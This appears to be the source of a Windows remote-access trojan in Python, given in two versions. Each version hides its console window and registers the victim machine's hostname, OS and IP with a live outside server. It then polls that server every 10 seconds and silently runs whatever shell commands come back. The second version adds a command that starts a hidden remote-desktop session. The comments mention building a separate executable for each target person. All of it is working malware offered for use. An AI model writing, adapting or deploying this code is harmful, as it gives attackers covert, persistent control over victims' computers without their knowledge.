import requests
import socket
import platform
import os
import subprocess
import time
import sys
import threading

# ========== CONFIGURATION ==========
SERVER_URL = "https://dollar-1rtv.onrender.com"  # Your Render URL
EXE_NAME = "1"  # Will be replaced for each person
GROUP_ID = "-1003587821331"  # Will be replaced for each person
# ==================================

# Hide the console window completely (for Windows)
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_computer_info():
    """Get information about the computer"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {
            'hostname': hostname,
            'os': platform.system(),
            'os_version': platform.version(),
            'ip': ip
        }
    except:
        return {
            'hostname': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'ip': 'Unknown'
        }

def register_device():
    """Tell the server this device clicked the .exe"""
    data = {
        'device_id': socket.gethostname(),
        'exe_name': EXE_NAME,
        'computer_info': get_computer_info(),
        'group_id': GROUP_ID
    }
    try:
        response = requests.post(f"{SERVER_URL}/register", json=data, timeout=10)
        return True
    except Exception as e:
        return False

def check_for_commands():
    """Check if server has commands for this device"""
    try:
        response = requests.get(f"{SERVER_URL}/devices", timeout=10)
        all_devices = response.json()
        device_id = socket.gethostname()
        
        if device_id in all_devices:
            device_data = all_devices[device_id]
            if 'pending_command' in device_data and device_data['pending_command']:
                command = device_data['pending_command']
                execute_command(command)
                # Clear the command after execution
                clear_command(device_id)
    except Exception as e:
        pass

def clear_command(device_id):
    """Tell the server to clear the command after execution"""
    try:
        requests.post(f"{SERVER_URL}/clear_command", json={'device_id': device_id}, timeout=5)
    except:
        pass

def execute_command(command):
    """Execute a command silently"""
    try:
        subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
    except:
        pass

def main():
    """Main function - runs silently"""
    # Register with server
    register_device()
    
    # Keep checking for commands every 10 seconds
    while True:
        check_for_commands()
        time.sleep(10)

if __name__ == '__main__':
    main()
    
    
    
    
    .................................
    import requests
import socket
import platform
import os
import subprocess
import time
import sys

# ========== CONFIGURATION ==========
SERVER_URL = "https://dollar-1rtv.onrender.com"
EXE_NAME = "1"  # This will be replaced for 2,3,4,5
GROUP_ID = "-1003587821331"  # Will be replaced
# ==================================

# Hide the console window completely
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {'hostname': hostname, 'os': platform.system(), 'os_version': platform.version(), 'ip': ip}
    except:
        return {'hostname': 'Unknown', 'os': 'Unknown', 'os_version': 'Unknown', 'ip': 'Unknown'}

def register_device():
    data = {'device_id': socket.gethostname(), 'exe_name': EXE_NAME, 'computer_info': get_computer_info(), 'group_id': GROUP_ID}
    try:
        requests.post(f"{SERVER_URL}/register", json=data, timeout=10)
        return True
    except:
        return False

def clear_command(device_id):
    try:
        requests.post(f"{SERVER_URL}/clear_command", json={'device_id': device_id}, timeout=5)
    except:
        pass

def execute_command(command):
    try:
        # Handle special remote commands
        if command == "START_REMOTE":
            # Start the Pocket Desk Agent remote session
            subprocess.Popen(["pdagent", "remote"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif command == "STOP_REMOTE":
            # Kill the remote session (optional: you can use taskkill)
            subprocess.run("taskkill /f /im cloudflared.exe", shell=True, capture_output=True)
        else:
            # Run any normal command
            subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def check_for_commands():
    try:
        response = requests.get(f"{SERVER_URL}/devices", timeout=10)
        all_devices = response.json()
        device_id = socket.gethostname()
        if device_id in all_devices and all_devices[device_id].get('pending_command'):
            command = all_devices[device_id]['pending_command']
            execute_command(command)
            clear_command(device_id)
    except:
        pass

def main():
    register_device()
    while True:
        check_for_commands()
        time.sleep(10)

if __name__ == '__main__':
    main()